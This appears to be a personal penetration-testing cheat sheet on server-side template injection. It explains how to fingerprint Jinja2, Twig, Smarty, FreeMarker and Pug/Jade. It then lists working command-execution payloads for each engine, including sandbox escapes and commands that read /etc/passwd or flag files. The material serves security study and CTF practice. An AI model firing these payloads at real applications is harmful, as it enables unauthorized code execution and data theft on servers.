#SSTI #WebInjection #WEB
# Template Engine process

1. **Template**: The engine uses a pre-designed template with placeholders like {{ name }} for dynamic content.
2. **User Input**: The engine receives user input (like a name, age, or message) and stores it in a variable.
3. **Combination**: The engine combines the template with the user input, replacing the placeholders with the actual data.
4. **Output**: The engine generates a final, dynamic web page with the user's input inserted into the template.
--- 

# Common Template Engines

- Python : **Jinja2**
- PHP : **Smarty**, **Twig** (***default template engine for Symfony***)
- Node.js : **Pug/Jade**
- Java: **FreeMaker**

---

# Determining Template Engine 

#Jinja2 and #Twig are similar in syntax and behavior, try **{{7*'7'}}**.
- If answer is 49, then its ***twig***
- If answer is 7777777, then it is ***Jinja2***

#Smarty could be detected using: **{'Hello I am in cases'|upper}** as a payload.
- if the answer is in uppercase, then it is exploitable
- Then you can write PHP code directly to the template

In #FreeMarker it could be detected by using  **${7\*7}**
- if it is evaluated to 49, then injection is possible
-  URL encoded : **%24%7B7\*7%7D**
- HTML escaped : **&#36;{7\*7}**

For #Pug/Jade the syntax is : **#{7\*7}**
- The answer should be 49

---
# Executing the Exploit

## Jinja2
Allows execution of python expressions using *check_output*

Usage:
```python
subprocess.check_output([command, arg1, arg2])
```

- **command**: A string that specifies the command to execute.
- **arg1, arg2, ...**: Additional arguments that should be passed to the command.
==EX:==
```python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```
```Python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
```
```Python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', 'FILE_NAME'])}}
```
- `"".__class__.__mro__[1]` accesses the base `object` class, the superclass of all Python classes.
- `__subclasses__()`: Lists all subclasses of `object`, and `[157]` is typically the index for the `subprocess.Popen` class 
- The subsequent method chains dynamically import and use the `subprocess` module to execute the `ls` command, capturing its output.
- *! The `subprocess.Popen` index may vary and should be checked in the target environment : `{{"".__class__.__mro__[1].__subclasses__()}}`*
### Trying to use`check_output('ls -lah')` will not work because the command is not split for arguments !


## Smarty
Smarty directly allows PHP code execution
==EX: ```
``` php
{system("ls")} 
```

## Twig
Directly allows PHP execution
==EX:==
```php
{{ system('ls') }}
```

#### Escaping the sandbox
```bash
{{ ['cat+flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',''] | sort('passthru') }}
```

- The payload is an array of strings.

- `sort('passthru')` is sorting the array using a custom comparison function called passthru.

- Twig internally calls `passthru($a, $b)` during sorting.

- Normally, in PHP:
	- `passthru()` runs a shell command and prints the result directly.

	- Since `passthru()` doesn’t return a value, PHP treats it as returning null → **but it still executes the command**.

## FreeMarker

The class freemarker.template.utility.Execute in the freemarker.template.utility package provides FreeMarker with the capability to execute external commands.

- Check the running version `${.version}`, if version is lower than 2.3.30 **it is vulnerable**.

**If there is NO SANDBOX**
- You can simply use 
```bash
${"freemarker.template.utility.Execute"?new()("COMMAND")} #Where COMMAND can be: ls, cat /etc/passwd etc...
```

If there is a SANDBOX
```bash
<#assign classloader=article.class.protectionDomain.classLoader> <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")> <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)> <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")> ${dwf.newInstance(ec,null)("cat /etc/passwd")}
```

## Pug/Jade
Pug/Jade directly allows JavaScript execution using ***spawnSync***

Usage: 
```js
spawnSync(command, [args], [options])
```
- **command**: This is a string that specifies the command to run.
- **args**:  An array of string arguments to pass to the command.
- **options**: This is an optional parameter that can specify various options such as the working directory, environment variables, input, output, timeout, and more.

==EX: ==
```js
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
```
```js
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```
```js
#{root.process.mainModule.require('child_process').spawnSync('cat', ['FILE_NAME']).stdout}
```
- `root.process` accesses the global `process` object from Node.js within the Pug template.
- `mainModule.require('child_process')` dynamically requires the `child_process` module, bypassing potential restrictions that might prevent its regular inclusion.
- `spawnSync('ls')`: Executes the `ls` command synchronously.
- `.stdout`: Captures the standard output of the command, which includes the directory listing
### Trying to use `spawnSync('ls -lah')` will not work because the command is not split for arguments !
 ---

# Tools

[[(2) Server-side Template Injection - Tools|Related Tools]]